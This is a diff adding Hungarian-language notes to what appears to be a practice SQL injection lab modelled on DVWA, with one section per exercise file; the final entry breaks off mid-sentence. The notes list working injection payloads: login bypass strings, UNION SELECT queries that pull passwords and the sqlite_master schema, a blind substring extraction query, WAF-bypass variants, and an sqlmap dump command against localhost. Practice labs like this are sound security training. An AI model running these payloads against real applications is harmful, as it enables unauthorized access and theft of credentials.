@@ -54,3 +54,35 @@ További sérülékenységek és vagy valami exploitok bemutatása/gyakorlása:
     -fájl letöltés/fájl tartalom kiiratás
     -...
     src: DVWA
+
+
+SQLi tesztelés:
+    _1_easy_login.py
+        - admin'--
+        - admin' OR '1'='1
+        ____________innen igazából részletkérdés______________________
+        - 'UNION SELECT 1,1,1,1 FROM users
+        - 'UNION SELECT name, sql, type, null FROM sqlite_master--
+    _2_easy_search.py
+        - 'UNION SELECT password from users--
+    _3_data_leak.py
+    itt alapvetően az volt a terv, hogy mivel nemtudjuk a jelszót, egy substring checkel megtudnánk szerezni a jelszót, 
+    vagy éppen itt lehetne használni a sqlmap-et ha valami bonyolultabb adatbázis lenne bújna meg a háttérbenb
+    alapvetően valami ilyesmi bonyolultságú tesztelgetés lenne a cél:
+    1 UNION SELECT 1/CASE WHEN SUBSTR((SELECT password FROM users WHERE username='admin'),1,2)='12' THEN 0 ELSE 1 END--
+    itt a gondolat a lekérdezés mögött az lenne, hogy amikor jó a substring, akkor 0-t v nullt kapunk vissza, amikor nem, akkor 1-et
+    ezt még így nem sikerült implementálni... helyette az előző feladathoz hasonló valamit kapunk, felhasználónév helyett id-val
+        - 1 UNION SELECT password FROM users--
+    _4_blind_boolean.py
+    ez egy brute force feladat, tipikusan sqlmap-et lehetne itt használni
+    így minden adatot kinyerhetünk, ami kell vele együtt a flag-et is
+    sqlmap -u "http://localhost:8000/sqli/4?username=*" --level=5 --risk=3 --batch --dump 
+    
+    _5_waf_bypass.py
+    az egyszerűbb megoldások itt már nem működnek, igaz elég hard-coded megoldás,de egyelőre ennyit tudtam megoldani
+    valamiért a char() függvény nem akar működni beágyazva, úgyhogy arra majd még !!!kell egy megoldás!!!
+        - admin' UNION SELECT 'admin', null, null, null FROM users--
+        - admin' UNION SELECT username, null, null, null FROM users--
+    _6_admin_pw_change.py
+    itt a 
+
